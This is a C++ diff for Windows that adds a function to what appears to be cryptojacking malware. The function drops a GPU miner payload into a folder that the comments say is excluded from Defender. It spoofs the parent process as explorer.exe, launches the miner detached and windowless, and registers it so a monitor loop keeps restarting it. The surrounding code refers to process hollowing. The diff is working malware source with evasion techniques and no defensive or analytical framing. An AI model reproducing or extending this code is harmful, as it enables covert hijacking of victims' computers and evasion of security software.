@@ -164,6 +164,110 @@ void abandon_hollow_process(PROCESS_INFORMATION& pi) {
 
 } // namespace
 
+// Writes the GPU miner payload to disk (inside the Defender-excluded folder)
+// and launches it as a normal process instead of hollowing it. The PID is
+// registered in ProcessStorage so the monitor loop keeps restarting and
+// suspending/resuming it exactly like an injected miner.
+DWORD drop_payload_and_run(const wchar_t* exePath, BYTE* payload, DWORD payloadSize, LPWSTR args)
+{
+    // 1) Drop the payload to disk.
+    HANDLE hFile = CreateFileW(exePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+                               FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        std::cerr << "[ERROR] Failed to create GPU miner file, Error = " << GetLastError() << "\n";
+        return 0;
+    }
+    DWORD written = 0;
+    BOOL ok = WriteFile(hFile, payload, payloadSize, &written, NULL);
+    CloseHandle(hFile);
+    if (!ok || written != payloadSize) {
+        std::cerr << "[ERROR] Failed to write GPU miner file\n";
+        return 0;
+    }
+
+    // 2) Build the command line.
+    wchar_t cmdLine[MAX_PATH * 2] = {0};
+    if (args != NULL && args[0] != L'\0') {
+        swprintf_s(cmdLine, L"\"%s\" %s", exePath, args);
+    } else {
+        swprintf_s(cmdLine, L"\"%s\"", exePath);
+    }
+
+    // 3) PPID spoof to explorer.exe (mirrors create_new_process_internal).
+    HANDLE hParent = NULL;
+    DWORD explorerPid = 0;
+
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pe = {};
+        pe.dwSize = sizeof(pe);
+        if (Process32FirstW(hSnap, &pe)) {
+            do {
+                if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
+                    explorerPid = pe.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+
+    if (explorerPid) {
+        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
+    }
+
+    SIZE_T attrListSize = 0;
+    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = nullptr;
+    bool useAttr = (hParent != NULL);
+
+    if (useAttr) {
+        InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);
+        pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
+        if (pAttrList) {
+            if (!InitializeProcThreadAttributeList(pAttrList, 1, 0, &attrListSize) ||
+                !UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                    &hParent, sizeof(hParent), nullptr, nullptr)) {
+                HeapFree(GetProcessHeap(), 0, pAttrList);
+                pAttrList = nullptr;
+                useAttr = false;
+            }
+        } else {
+            useAttr = false;
+        }
+    }
+
+    STARTUPINFOEXW siex = {};
+    siex.StartupInfo.cb  = useAttr ? sizeof(STARTUPINFOEXW) : sizeof(STARTUPINFOW);
+    siex.lpAttributeList = useAttr ? pAttrList : nullptr;
+
+    DWORD flags = DETACHED_PROCESS | CREATE_NO_WINDOW;
+    if (useAttr) flags |= EXTENDED_STARTUPINFO_PRESENT;
+
+    PROCESS_INFORMATION pi = { 0 };
+    BOOL created = CreateProcessW(
+        nullptr,
+        cmdLine,
+        nullptr, nullptr,
+        FALSE,
+        flags,
+        nullptr, nullptr,
+        (LPSTARTUPINFOW)&siex,
+        &pi
+    );
+
+    if (pAttrList) { DeleteProcThreadAttributeList(pAttrList); HeapFree(GetProcessHeap(), 0, pAttrList); }
+    if (hParent)   { CloseHandle(hParent); }
+
+    if (!created) {
+        std::cerr << "[ERROR] CreateProcessW (GPU miner) failed, Error = " << GetLastError() << "\n";
+        return 0;
+    }
+
+    ProcessStorage::AddProcess(pi.dwProcessId, pi);
+    std::cout << "Launched GPU miner from disk, PID: " << std::dec << pi.dwProcessId << "\n";
+    return pi.dwProcessId;
+}
+
 DWORD transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize, LPWSTR args)
 {
     wchar_t dummy_name[MAX_PATH] = { 0 };
